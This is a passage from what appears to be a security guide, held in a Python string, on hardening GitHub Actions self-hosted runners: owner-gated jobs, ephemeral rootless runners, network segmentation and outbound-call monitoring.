       github.event.pull_request.author_association == 'OWNER')
    runs-on: [self-hosted, linux, x64]
    steps: [...]
```

**✅ Secure Fix - option C: use ephemeral, rootless runners:**
```yaml
# Deploy actions-runner-controller with ephemeral runners:
# https://github.com/actions/actions-runner-controller
# Each PR job runs on a one-shot runner that is destroyed after the job -
# persistence is impossible even if a bad actor breaks out.
```

**🔐 Hardening:**
- **Never** use self-hosted runners on public repositories without a
  trusted-actor gate. GitHub's own guidance:
  https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#hardening-for-self-hosted-runners
- Runners must be **rootless**: do not run the runner agent as root.
- Runners must be **network-segmented**: the runner host should not reach
  your production VPC or secrets management; it sees only what it needs.
- Monitor with `stepsecurity/harden-runner` (block-mode) - it denies
  outbound network calls not in an allowlist.
"""
